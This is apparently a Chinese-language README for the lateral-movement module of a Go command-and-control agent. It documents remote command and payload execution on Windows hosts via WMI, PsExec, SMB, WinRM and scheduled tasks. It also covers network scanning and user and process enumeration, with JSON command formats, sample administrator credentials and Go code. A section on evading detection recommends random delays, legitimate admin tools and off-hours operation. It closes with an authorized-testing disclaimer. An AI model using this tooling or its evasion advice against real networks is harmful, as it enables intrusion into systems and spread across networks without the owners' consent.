# 横向移动模块 (Lateral Movement)

## 概述

横向移动模块提供了在获取初始访问权限后，在目标网络内部移动到其他主机的能力。该模块支持多种常见的横向移动技术。

## 目录结构

```
agent/lateral/
├── lateral.go      # 核心管理器和通用功能
├── wmi.go          # WMI 横向移动实现
├── psexec.go       # PsExec 横向移动实现
├── smb.go          # SMB 横向移动实现
├── schtasks.go     # 计划任务横向移动实现
└── recon.go        # 侦察和信息收集功能
```

## 支持的横向移动方法

### 1. WMI (Windows Management Instrumentation)
- **方法名**: `wmi`
- **描述**: 使用 Windows 内置的 WMI 服务在远程主机上执行命令
- **优点**: 无需额外工具，隐蔽性较好
- **权限要求**: 目标主机管理员权限

### 2. PsExec
- **方法名**: `psexec`
- **描述**: 使用 Sysinternals PsExec 工具执行远程命令
- **优点**: 功能强大，支持文件复制
- **权限要求**: 目标主机管理员权限，需要 PsExec.exe

### 3. SMB
- **方法名**: `smb`
- **描述**: 通过 SMB 共享复制文件并执行
- **优点**: 适合传输和执行 Payload
- **权限要求**: 目标主机管理员权限，SMB 端口开放

### 4. WinRM (Windows Remote Management)
- **方法名**: `winrm`
- **描述**: 使用 PowerShell Remoting 执行远程命令
- **优点**: 现代 Windows 系统支持，功能强大
- **权限要求**: 目标主机启用 WinRM，管理员权限

### 5. 计划任务 (Scheduled Tasks)
- **方法名**: `schtasks`
- **描述**: 创建计划任务并立即执行
- **优点**: 可绕过某些防护，持久化
- **权限要求**: 目标主机管理员权限

## 使用方法

### 命令格式

横向移动命令使用 JSON 格式，通过 `lateral_move:` 前缀发送：

```json
lateral_move:{
  "id": "unique_request_id",
  "method": "wmi|psexec|smb|winrm|schtasks",
  "target_ip": "192.168.1.100",
  "target_host": "TARGET-PC",
  "port": 0,
  "username": "administrator",
  "password": "Password123",
  "domain": "WORKGROUP",
  "command": "whoami",
  "payload_path": "C:\\path\\to\\payload.exe"
}
```

### 示例

#### 1. 使用 WMI 执行命令

```json
lateral_move:{
  "id": "req001",
  "method": "wmi",
  "target_ip": "192.168.1.100",
  "username": "administrator",
  "password": "Password123",
  "command": "whoami"
}
```

#### 2. 使用 PsExec 执行 Payload

```json
lateral_move:{
  "id": "req002",
  "method": "psexec",
  "target_ip": "192.168.1.100",
  "username": "administrator",
  "password": "Password123",
  "payload_path": "C:\\payload\\agent.exe"
}
```

#### 3. 使用 SMB 复制并执行文件

```json
lateral_move:{
  "id": "req003",
  "method": "smb",
  "target_ip": "192.168.1.100",
  "username": "administrator",
  "password": "Password123",
  "payload_path": "C:\\payload\\agent.exe"
}
```

#### 4. 使用 WinRM 执行 PowerShell

```json
lateral_move:{
  "id": "req004",
  "method": "winrm",
  "target_ip": "192.168.1.100",
  "username": "administrator",
  "password": "Password123",
  "domain": "CORP",
  "command": "Get-Process"
}
```

## 侦察功能

侦察命令使用 `recon:` 前缀：

```json
recon:{
  "id": "recon001",
  "type": "scan|smbcheck|wmicheck|winrmcheck|sysinfo|processes|users",
  "target_ip": "192.168.1.100",
  "subnet": "192.168.1",
  "username": "administrator",
  "password": "Password123",
  "domain": "WORKGROUP"
}
```

### 侦察类型

1. **scan**: 扫描网络中的存活主机
   ```json
   recon:{"id":"r1","type":"scan","subnet":"192.168.1"}
   ```

2. **smbcheck**: 检查 SMB 访问权限
   ```json
   recon:{"id":"r2","type":"smbcheck","target_ip":"192.168.1.100","username":"admin","password":"pass"}
   ```

3. **wmicheck**: 检查 WMI 访问权限
   ```json
   recon:{"id":"r3","type":"wmicheck","target_ip":"192.168.1.100","username":"admin","password":"pass"}
   ```

4. **winrmcheck**: 检查 WinRM 访问权限
   ```json
   recon:{"id":"r4","type":"winrmcheck","target_ip":"192.168.1.100","username":"admin","password":"pass"}
   ```

5. **sysinfo**: 获取目标系统信息
   ```json
   recon:{"id":"r5","type":"sysinfo","target_ip":"192.168.1.100","username":"admin","password":"pass"}
   ```

6. **processes**: 列出目标主机进程
   ```json
   recon:{"id":"r6","type":"processes","target_ip":"192.168.1.100","username":"admin","password":"pass"}
   ```

7. **users**: 列出目标主机用户
   ```json
   recon:{"id":"r7","type":"users","target_ip":"192.168.1.100","username":"admin","password":"pass"}
   ```

## 响应格式

### 横向移动响应

```json
{
  "id": "req001",
  "success": true,
  "method": "wmi",
  "target": "192.168.1.100",
  "message": "Command executed successfully via WMI",
  "output": "DOMAIN\\Administrator"
}
```

### 侦察响应

```json
{
  "id": "recon001",
  "success": true,
  "type": "scan",
  "data": "Found 5 hosts: [192.168.1.1, 192.168.1.100, ...]"
}
```

## 代码示例

### 在 Agent 中使用

```go
package main

import (
    "github.com/yourusername/c2/agent/lateral"
)

func main() {
    // 创建横向移动管理器
    lm := lateral.NewLateralMover()
    
    // 配置目标和凭证
    req := lateral.MoveRequest{
        Method: lateral.MethodWMI,
        Target: lateral.Target{
            IP: "192.168.1.100",
        },
        Credentials: lateral.Credentials{
            Username: "administrator",
            Password: "Password123",
        },
        Command: "whoami",
    }
    
    // 执行横向移动
    result := lm.Move(req)
    
    if result.Success {
        println("Success:", result.Output)
    } else {
        println("Failed:", result.Message)
    }
}
```

### 网络扫描

```go
import "github.com/yourusername/c2/agent/lateral"

// 扫描网段
ips, err := lateral.ScanNetwork("192.168.1")
if err != nil {
    // 处理错误
}

for _, ip := range ips {
    println("Found host:", ip)
}
```

### 访问权限检查

```go
import "github.com/yourusername/c2/agent/lateral"

target := lateral.Target{IP: "192.168.1.100"}
creds := lateral.Credentials{
    Username: "administrator",
    Password: "Password123",
}

// 检查 SMB 访问
if lateral.CheckSMBAccess(target, creds) {
    println("SMB access available")
}

// 检查 WMI 访问
if lateral.CheckWMIAccess(target, creds) {
    println("WMI access available")
}

// 检查 WinRM 访问
if lateral.CheckWinRMAccess(target, creds) {
    println("WinRM access available")
}
```

## 安全注意事项

1. **凭证安全**: 避免在日志中记录明文密码
2. **网络检测**: 横向移动会产生网络流量，可能被 IDS/IPS 检测
3. **权限要求**: 大多数方法需要目标主机的管理员权限
4. **防病毒**: 某些方法可能被杀毒软件拦截
5. **日志清理**: 操作会在目标主机上留下日志记录

## 防御规避建议

1. 使用域凭证而不是本地凭证
2. 限制同时连接的主机数量
3. 添加随机延迟避免模式检测
4. 使用合法的管理工具（如 WMI、WinRM）
5. 在非工作时间执行操作

## 依赖项

- Windows 操作系统
- 管理员权限
- 网络连接
- 目标主机开放相应端口（SMB: 445, WinRM: 5985/5986, RDP: 3389）

## 错误处理

所有函数都返回详细的错误信息，包括：
- 连接失败
- 认证失败
- 权限不足
- 命令执行失败
- 网络超时

## 扩展性

模块设计为可扩展的，可以轻松添加新的横向移动方法：

1. 在 `lateral.go` 中添加新的 `MoveMethod` 常量
2. 实现新的横向移动方法函数
3. 在 `Move()` 方法的 switch 语句中添加新的 case
4. 更新文档

## 许可和免责声明

**仅用于授权的安全测试和教育目的。未经授权使用此工具进行攻击是非法的。**
